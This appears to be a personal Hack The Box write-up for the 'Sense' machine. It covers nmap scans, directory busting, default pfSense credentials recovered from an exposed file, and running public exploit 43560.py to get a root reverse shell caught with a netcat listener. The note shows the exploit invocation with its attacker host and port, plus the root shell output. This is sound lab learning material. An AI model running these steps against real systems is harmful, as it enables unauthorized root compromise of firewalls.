Tags: #htb, #hacking 
Related to: #practice, #htb, #write-up, #rce, #pfsense,
Index: [[🗂️Index of HTB Writeups]] 

#### First things First!

###### Quick fast scan on top 100 ports
```sh
nmap -F -Pn -T4 10.10.10.60
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 22:12 EDT
Nmap scan report for 10.10.10.60
Host is up (0.047s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
```

We have port 80 and 443 Open

Same result for top 1k ports scan and all port scan

Default scripts scan and Version scan on Port 443 and 80

```sh
map -sC -sV -Pn  -p443,80 10.10.10.60                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 22:14 EDT
Nmap scan report for 10.10.10.60
Host is up (0.072s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.72 seconds

```

We have - lighttpd 1.4.35 - server
Nothing interesting (no interesting vulns)

Tried to browse the page and I get a login page.

![[Pasted image 20230803074949.png]]

Lets dirbust and also think of sign in bypass

Found  this endpoint during dirbusting
`\tree`

![[Pasted image 20230803084734.png]]

**Found version:**
SilverStripe Tree Control: v0.1,

https://www.exploit-db.com/exploits/34113 - Possible vuln

https://www.exploit-db.com/raw/34113

Changes made

```sh
host = '10.10.10.60'
port = 80
path = '/tree'
```

Exploit doesn't seem to work

---
Dirbusting reveals
changelog.txt & system-users.txt.

![[Pasted image 20230803102904.png]]

![[Pasted image 20230803102930.png]]

Creds
Rohit:pfsense

pfsense is default password for pfsense firewall

---

![[Pasted image 20230803103037.png]]

We can see the version of pfsense is 2.1.3
![[Pasted image 20230803103223.png]]

We copy exploit to our directory
![[Pasted image 20230803103329.png]]

On checking exploit we see that it takes the arguments and runs a python reverse shell

```sh
python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.10 --lport 4443 --username rohit --password pfsense
```

We get a direct root shell

```sh
└─$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.60] 55834
sh: can't access tty; job control turned off
# whoami
root
# 
```

Root flag🚩 in /root/root.txt
User flag 🚩 in /home/rohit/user.txt